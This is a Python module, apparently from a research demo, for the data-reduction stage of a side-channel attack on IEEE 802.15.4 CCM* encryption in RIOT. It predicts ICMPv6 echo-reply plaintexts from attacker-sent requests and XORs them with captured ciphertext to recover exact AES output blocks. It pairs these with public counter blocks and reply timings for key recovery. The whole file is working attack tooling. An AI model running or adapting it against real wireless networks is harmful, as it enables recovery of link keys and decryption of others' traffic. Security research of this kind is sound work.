"""Captured frames in, known AES output blocks and the attacker's clock out.

The reduction this demo rests on, in one place. An ICMPv6 echo reply is its
request with two edits -- ICMPv6 type 0x80 -> 0x81 and the checksum adjusted
by -0x0100 in ones-complement arithmetic, which wraps at 0xffff and not at
0x10000 -- so the attacker can write the reply's plaintext down from the
request it sent itself. XOR that with the ciphertext it heard and the result is
`AES_K(A_i)`: the raw block cipher output, for a counter block built entirely
out of fields the frame carries in the clear.

So the quantity the last-round attack scores against is not a guess about the
plaintext. It is the cipher's own output, known exactly, as many blocks per
reply as the payload divides into.

WHAT THIS REJECTS, and why each one matters rather than being hygiene:
  * no summary, or a reply later than 10 ms: a retried or lost exchange. The
    interval is then not one request-to-reply path.
  * anything but exactly one unsecured request and one secured reply in the
    ring: an ambiguous probe, usually a retransmission.
  * an unexpected frame shape: the addresses not swapped, the 6LoWPAN/ICMPv6
    header not where it should be, a bad CRC, a security level that is not 6.
  * a reply with no MAC ACK recorded: the ACK is the common-mode reference and
    a row without it cannot be conditioned the same way as the others.

The predicted plaintext is occasionally wrong -- about 0.09 % of blocks on the
measured capture, which the known-key check reports and which costs a fraction
of a percent of the traces. It is the prediction missing on an odd frame, not
the key.
"""

import json
from collections import Counter
from pathlib import Path

SECURITY_LEVEL = 6          # ENC-MIC-64, RIOT's own default
MHR_BYTES = 21              # FCF, seq, PAN id, two extended addresses
AUX_BYTES = 5               # security control + 4-byte frame counter
MIC_BYTES = 8               # security level 6
LATE_US = 10000


def counter_block(src_le, counter, index, level=SECURITY_LEVEL):
    """CCM* A_i: flags || nonce || 2-byte block index, every byte public.

    The nonce is the source EUI-64 big-endian, the 4-byte frame counter
    big-endian and the security level -- the frame carries all three in the
    clear, which is what makes this attack possible at all.
    """
    return (bytes([1]) + bytes(src_le[::-1]) + int(counter).to_bytes(4, "big")
            + bytes([level]) + int(index).to_bytes(2, "big"))


def predict_reply_plaintext(request_payload):
    """The reply's plaintext, from the request the attacker sent."""
    plain = bytearray(request_payload)
    plain[3] = 0x81
    checksum = (int.from_bytes(plain[5:7], "big") - 0x0100) % 0xffff
    plain[5:7] = checksum.to_bytes(2, "big")
    return bytes(plain)


def extract(paths, blocks=(1,)):
    """[row] for every clean probe, and a Counter of why the rest went.

    One pass over the files for all the requested CTR blocks, so a four-block
    reduction costs one read of the capture rather than four.
    """
    rows, rejected = [], Counter()
    need = 16 * (max(blocks) - 1) + 16
    for path in paths:
        with Path(path).open() as stream:
            for line in stream:
                record = json.loads(line)
                summary = record.get("summary")
                if summary is None or summary["reply_ticks"] / 16 >= LATE_US:
                    rejected["missing, retried or later than 10 ms"] += 1
                    continue
                if summary.get("ack_ticks") is None:
                    rejected["no MAC ACK recorded"] += 1
                    continue
                reqs = [s for s in record["stamps"] if s["direction"] == 1
                        and "frame" in s and (s["fcf0"] & 7) == 1]
                reps = [s for s in record["stamps"] if s["direction"] == 2
                        and "frame" in s and (s["fcf0"] & 15) == 9]
                if len(reqs) != 1 or len(reps) != 1:
                    rejected["ambiguous captured frames"] += 1
                    continue
                req = bytes.fromhex(reqs[0]["frame"])
                rep = bytes.fromhex(reps[0]["frame"])
                payload_len = len(req) - MHR_BYTES
                if not (need <= payload_len <= 96
                        and len(rep) == MHR_BYTES + AUX_BYTES + payload_len + MIC_BYTES
                        and req[:2] == b"\x61\xdc" and rep[:2] == b"\x69\xdc"
                        and req[5:13] == rep[13:21] and req[13:21] == rep[5:13]
                        and req[21:25] == b"\x7a\x33\x3a\x80"
                        and (rep[21] & 7) == SECURITY_LEVEL
                        and reqs[0]["crc"] and reps[0]["crc"]):
                    rejected["unexpected frame shape"] += 1
                    continue
                plain = predict_reply_plaintext(req[MHR_BYTES:MHR_BYTES + payload_len])
                body = rep[MHR_BYTES + AUX_BYTES:-MIC_BYTES]
                counter = int.from_bytes(rep[22:26], "little")
                level = rep[21] & 7
                out = {}
                for b in blocks:
                    lo = 16 * (b - 1)
                    out[b] = bytes(x ^ y for x, y in
                                   zip(plain[lo:lo + 16], body[lo:lo + 16]))
                rows.append(dict(source=str(path), probe=record["i"],
                                 frame_counter=counter, security_level=level,
                                 src_eui_le=rep[13:21], payload_len=payload_len,
                                 aes_output=out,
                                 radio_us=summary["reply_ticks"] / 16,
                                 ack_us=summary["ack_ticks"] / 16))
    if not rows:
        raise ValueError("no clean frame pairs in %d file(s)" % len(list(paths)))
    base = min(r["radio_us"] for r in rows)
    for r in rows:
        r["csma_slot"] = round((r["radio_us"] - base) / 320)
        r["slot_adjusted_us"] = r["radio_us"] - 320.0 * r["csma_slot"]
    return rows, rejected


def known_pair(rows, block=1):
    """One (counter block, keystream block) the attacker heard, for verifying.

    Taken from a row the caller has held out of the attack, so the check is
    against a frame the score surfaces never saw.
    """
    row = rows[0]
    return (counter_block(row["src_eui_le"], row["frame_counter"], block,
                          row["security_level"]),
            row["aes_output"][block])
